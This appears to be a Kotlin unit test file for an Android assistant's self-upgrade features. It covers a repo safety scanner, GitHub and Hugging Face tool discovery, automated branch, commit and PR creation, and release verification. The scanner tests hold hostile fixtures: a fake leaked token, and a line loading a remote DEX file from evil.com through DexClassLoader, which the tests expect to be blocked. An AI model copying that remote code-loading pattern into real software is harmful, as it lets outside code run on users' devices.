package com.zehn.assistant

import android.content.Context
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.zehn.assistant.ai.AiEngineRouter
import com.zehn.assistant.ai.CloudLlmClient
import com.zehn.assistant.ai.OnDeviceLiteRtManager
import com.zehn.assistant.ai.RagEngine
import com.zehn.assistant.data.PreferencesRepository
import com.zehn.assistant.data.db.ZehnDatabase
import com.zehn.assistant.security.KeystoreCryptoManager
import com.zehn.assistant.security.SafetyPolicyManager
import com.zehn.assistant.upgrade.AutonomousResearchAgent
import com.zehn.assistant.upgrade.CommitFileChange
import com.zehn.assistant.upgrade.GitHubAutoDevEngine
import com.zehn.assistant.upgrade.ReleaseUpdateManager
import com.zehn.assistant.upgrade.RepoSafetyAnalyzer
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.Json
import okhttp3.Interceptor
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Protocol
import okhttp3.Response
import okhttp3.ResponseBody.Companion.toResponseBody
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35])
class ZehnV40AutonomousUpgradeTest {

    private lateinit var context: Context
    private lateinit var db: ZehnDatabase
    private lateinit var crypto: KeystoreCryptoManager
    private lateinit var safetyPolicy: SafetyPolicyManager
    private lateinit var prefs: PreferencesRepository
    private lateinit var safetyAnalyzer: RepoSafetyAnalyzer

    @Before
    fun setUp() {
        context = ApplicationProvider.getApplicationContext()
        db = Room.inMemoryDatabaseBuilder(context, ZehnDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        crypto = KeystoreCryptoManager(context)
        crypto.clearAllSecrets()
        safetyPolicy = SafetyPolicyManager(context, Json { ignoreUnknownKeys = true })
        prefs = PreferencesRepository(context)
        safetyAnalyzer = RepoSafetyAnalyzer()
    }

    @After
    fun tearDown() {
        db.close()
    }

    @Test
    fun `safety analyzer checks licenses, blocks secrets and malware, detects duplicates, and gates sensitive edits`() {
        val mitEval = safetyAnalyzer.evaluateLicense("MIT")
        assertEquals("COMPATIBLE", mitEval.status)

        val gplEval = safetyAnalyzer.evaluateLicense("GPL-3.0")
        assertEquals("INCOMPATIBLE", gplEval.status)

        val cleanTool = safetyAnalyzer.evaluateTool(
            source = "GITHUB",
            identifier = "modelcontextprotocol/kotlin-sdk",
            name = "kotlin-sdk",
            description = "Official Kotlin SDK for Model Context Protocol servers & tools",
            starsOrDownloads = 320,
            lastUpdated = "2026-10-12",
            rawLicense = "MIT",
            languageOrPipeline = "Kotlin",
            readmeText = "MIT License\nimplementation(\"io.modelcontextprotocol:kotlin-sdk:0.4.0\")",
            gradleText = "android { defaultConfig { minSdk = 26 } }",
            htmlUrl = "https://github.com/modelcontextprotocol/kotlin-sdk",
            deviceRamMb = 8192L
        )
        assertTrue(cleanTool.compatibilityScore >= 75)
        assertEquals(26, cleanTool.supportedAndroidMinSdk)
        assertEquals("CLEAR", cleanTool.securityFlags)
        assertFalse(cleanTool.isDuplicate)

        // Duplicate detection against CameraX/ML Kit
        val dup = safetyAnalyzer.detectDuplicateFunctionality(
            "camerax-ocr-helper",
            "CameraX MLKit barcode scanner",
            "androidx.camera:camera-core"
        )
        assertTrue(dup.first)

        // Commit diff scanner must block leaked PATs, workflow edits when OFF, and DexClassLoader
        val secretDiff = listOf(CommitFileChange("app/Foo.kt", "val k = \"ghp_1234567890abcdef\""))
        assertFalse(safetyAnalyzer.scanCommitDiff(secretDiff, allowWorkflowEdits = false).clean)

        val workflowDiff = listOf(CommitFileChange(".github/workflows/evil.yml", "name: test"))
        assertFalse(safetyAnalyzer.scanCommitDiff(workflowDiff, allowWorkflowEdits = false).clean)

        val malwareDiff = listOf(CommitFileChange("app/Loader.kt", "DexClassLoader(\"https://evil.com/a.dex\")"))
        assertFalse(safetyAnalyzer.scanCommitDiff(malwareDiff, allowWorkflowEdits = false).clean)

        // Sensitive permission gating
        val sensitiveRisk = safetyAnalyzer.assessIntegrationRisk(cleanTool, listOf("app/src/main/AndroidManifest.xml"))
        assertEquals("SENSITIVE", sensitiveRisk.riskLevel)
        assertTrue(sensitiveRisk.requiresApproval)

        val lowRisk = safetyAnalyzer.assessIntegrationRisk(cleanTool, listOf("app/src/main/java/com/zehn/assistant/upgrade/adapters/McpAdapter.kt"))
        assertEquals("LOW", lowRisk.riskLevel)
        assertFalse(lowRisk.requiresApproval)
    }

    @Test
    fun `autonomous github research deduplicates cached tools and creates verified integration proposals`() = runBlocking {
        val mockClient = scriptedHttpClient { url ->
            when {
                url.contains("api.github.com/search/repositories") -> 200 to """
                    {
                      "items": [
                        {
                          "full_name": "zehn-oss/android-mcp-adapter",
                          "description": "Lightweight MCP client tools for Kotlin Android assistants",
                          "stargazers_count": 145,
                          "language": "Kotlin",
                          "pushed_at": "2026-11-01T10:00:00Z",
                          "html_url": "https://github.com/zehn-oss/android-mcp-adapter",
                          "license": { "spdx_id": "Apache-2.0" }
                        }
                      ]
                    }
                """.trimIndent()
                url.contains("/readme") -> 200 to """{"content":"QXBhY2hlLTIuMA=="}"""
                url.contains("api.github.com/repos/") && url.contains("/contents/") -> 200 to """{"content":"bWluU2RrID0gMjQ="}"""
                url.contains("huggingface.co/api/models") -> 200 to """
                    [
                      {
                        "id": "zehn-hf/urdu-whisper-tiny-onnx",
                        "pipeline_tag": "automatic-speech-recognition",
                        "downloads": 8400,
                        "tags": ["license:apache-2.0", "ur", "en"]
                      }
                    ]
                """.trimIndent()
                else -> 404 to "{}"
            }
        }

        val liteRt = OnDeviceLiteRtManager(context, mockClient, crypto, db.actionLogDao())
        val agent = AutonomousResearchAgent(
            okHttpClient = mockClient,
            crypto = crypto,
            prefs = prefs,
            upgradeDao = db.upgradeCenterDao(),
            liteRtManager = liteRt,
            safetyAnalyzer = safetyAnalyzer
        )

        val firstRun = agent.runFullResearchCycle(
            includeGitHub = true,
            includeHuggingFace = true,
            customQuery = "mcp"
        ).getOrThrow()

        assertEquals(2, firstRun.newlyDiscoveredCount)
        assertEquals(0, firstRun.skippedDuplicatesCount)
        assertTrue(firstRun.proposalsCreatedCount >= 1)

        val cachedTools = db.upgradeCenterDao().observeDiscoveredTools().first()
        assertEquals(2, cachedTools.size)

        // Second run must skip already evaluated tools instead of re-evaluating
        val secondRun = agent.runFullResearchCycle(
            includeGitHub = true,
            includeHuggingFace = true,
            customQuery = "mcp"
        ).getOrThrow()
        assertEquals(0, secondRun.newlyDiscoveredCount)
        assertEquals(2, secondRun.skippedDuplicatesCount)
    }

    @Test
    fun `github auto-dev auth, branch creation, atomic commit, PR creation, and rollback flow work end to end`() = runBlocking {
        var branchCreated = false
        val mockClient = OkHttpClient.Builder()
            .addInterceptor(Interceptor { chain ->
                val req = chain.request()
                val url = req.url.toString()
                val (code, body) = when {
                    url == "https://api.github.com/user" -> 200 to """{"login":"zehn-maintainer"}"""
                    url == "https://api.github.com/repos/zehn/zehn-ai" -> 200 to """{"default_branch":"main","permissions":{"push":true,"pull":true}}"""
                    url.endsWith("/git/ref/heads/main") -> 200 to """{"object":{"sha":"base1111111111"}}"""
                    url.endsWith("/git/ref/heads/zehn-auto/feat-mcp") && req.method == "GET" -> {
                        if (!branchCreated) 404 to "{}" else 200 to """{"object":{"sha":"base1111111111"}}"""
                    }
                    url.endsWith("/git/refs/heads/zehn-auto/feat-mcp") && req.method == "PATCH" -> {
                        200 to """{"object":{"sha":"commit777777"}}"""
                    }
                    url.endsWith("/git/refs") && req.method == "POST" -> {
                        branchCreated = true
                        201 to """{"ref":"refs/heads/zehn-auto/feat-mcp","object":{"sha":"base1111111111"}}"""
                    }
                    url.endsWith("/git/commits/base1111111111") -> 200 to """{"tree":{"sha":"tree000000"}}"""
                    url.endsWith("/git/blobs") -> 201 to """{"sha":"blob999999"}"""
                    url.endsWith("/git/trees") -> 201 to """{"sha":"tree888888"}"""
                    url.endsWith("/git/commits") -> 201 to """{"sha":"commit777777"}"""
                    url.endsWith("/pulls") -> 201 to """{"number":42,"html_url":"https://github.com/zehn/zehn-ai/pull/42"}"""
                    url.contains("/actions/runs") -> 200 to """{"workflow_runs":[{"id":9001,"status":"completed","conclusion":"success","html_url":"https://github.com/zehn/zehn-ai/actions/runs/9001","updated_at":"2026-11-16T00:00:00Z"}]}"""
                    else -> 404 to "{}"
                }
                Response.Builder()
                    .request(req)
                    .protocol(Protocol.HTTP_1_1)
                    .code(code)
                    .message(if (code in 200..299) "OK" else "ERR")
                    .body(body.toResponseBody("application/json".toMediaType()))
                    .build()
            })
            .build()

        crypto.saveSecret(KeystoreCryptoManager.KEY_GITHUB_TOKEN, "github_pat_unit_test_12345678")
        prefs.updateSettings { it.copy(githubRepoSlug = "zehn/zehn-ai", githubBaseBranch = "main") }

        val cloud = CloudLlmClient(context, mockClient, crypto, safetyPolicy, db.actionLogDao())
        val liteRt = OnDeviceLiteRtManager(context, mockClient, crypto, db.actionLogDao())
        val rag = RagEngine(context, db.projectRagDao())
        val router = AiEngineRouter(prefs, cloud, liteRt, rag, db.memoryDao(), db.skillDao(), db.actionLogDao())
        val engine = GitHubAutoDevEngine(mockClient, crypto, prefs, db.upgradeCenterDao(), safetyAnalyzer, router)

        val conn = engine.testConnection()
        assertTrue(conn.connected)
        assertEquals("zehn-maintainer", conn.username)
        assertTrue(conn.canPush)

        val branchSha = engine.createOrUpdateBranch("zehn/zehn-ai", "github_pat_unit_test_12345678", "zehn-auto/feat-mcp", "main").getOrThrow()
        assertEquals("base1111111111", branchSha)

        val commitSha = engine.commitChangesAtomic(
            repoSlug = "zehn/zehn-ai",
            token = "github_pat_unit_test_12345678",
            branch = "zehn-auto/feat-mcp",
            changes = listOf(CommitFileChange("docs/test.md", "# Test Integration")),
            commitMessage = "test(auto-dev): harmless integration"
        ).getOrThrow()
        assertEquals("commit777777", commitSha)

        val pr = engine.openPullRequest("zehn/zehn-ai", "github_pat_unit_test_12345678", "zehn-auto/feat-mcp", "main", "Test PR", "Changelog").getOrThrow()
        assertEquals(42, pr.first)

        val build = engine.pollLatestActionsRun("zehn-auto/feat-mcp").getOrThrow()
        assertEquals("success", build.conclusion)

        val rollback = engine.rollbackBranchToStable("zehn-auto/feat-mcp")
        assertTrue(rollback.isSuccess)
        assertTrue(db.upgradeCenterDao().observeDevRuns().first().isNotEmpty())
    }

    @Test
    fun `release update manager verifies trusted GitHub releases, detects newer versions, and rejects untrusted URLs`() = runBlocking {
        val mockClient = scriptedHttpClient { url ->
            when {
                url.contains("/releases") -> 200 to """
                    [
                      {
                        "tag_name": "v9.9.9",
                        "name": "Zehn AI v9.9.9",
                        "body": "versionCode: 999\n- Autonomous research engine",
                        "html_url": "https://github.com/zehn/zehn-ai/releases/tag/v9.9.9",
                        "published_at": "2026-11-16T01:00:00Z",
                        "draft": false,
                        "assets": [
                          {
                            "name": "zehn-ai-release-v9.9.9.apk",
                            "browser_download_url": "https://github.com/zehn/zehn-ai/releases/download/v9.9.9/zehn-ai-release-v9.9.9.apk",
                            "size": 18450000
                          }
                        ]
                      }
                    ]
                """.trimIndent()
                else -> 404 to "{}"
            }
        }

        prefs.updateSettings { it.copy(githubRepoSlug = "zehn/zehn-ai") }
        val mgr = ReleaseUpdateManager(context, mockClient, crypto, prefs, db.upgradeCenterDao())

        val summary = mgr.checkForVerifiedReleaseUpdate(notifyIfNewer = false).getOrThrow()
        assertTrue(summary.updateAvailable)
        assertNotNull(summary.latestRelease)
        assertEquals("9.9.9", summary.latestRelease?.versionName)
        assertEquals(999, summary.latestRelease?.parsedVersionCode)
        assertTrue(summary.latestRelease!!.compatibleWithDevice)

        assertTrue(mgr.isVersionNewer("4.1.0", "4.0.0"))
        assertFalse(mgr.isVersionNewer("4.0.0", "4.0.0"))
        assertTrue(mgr.isTrustedGitHubUrl("https://github.com/zehn/zehn-ai/releases/download/v4.1.0/app.apk"))
        assertFalse(mgr.isTrustedGitHubUrl("http://untrusted-site.example.com/evil.apk"))
    }

    private fun scriptedHttpClient(handler: (String) -> Pair<Int, String>): OkHttpClient {
        return OkHttpClient.Builder()
            .addInterceptor(Interceptor { chain ->
                val url = chain.request().url.toString()
                val (code, body) = handler(url)
                Response.Builder()
                    .request(chain.request())
                    .protocol(Protocol.HTTP_1_1)
                    .code(code)
                    .message(if (code in 200..299) "OK" else "ERR")
                    .body(body.toResponseBody("application/json".toMediaType()))
                    .build()
            })
            .build()
    }
}
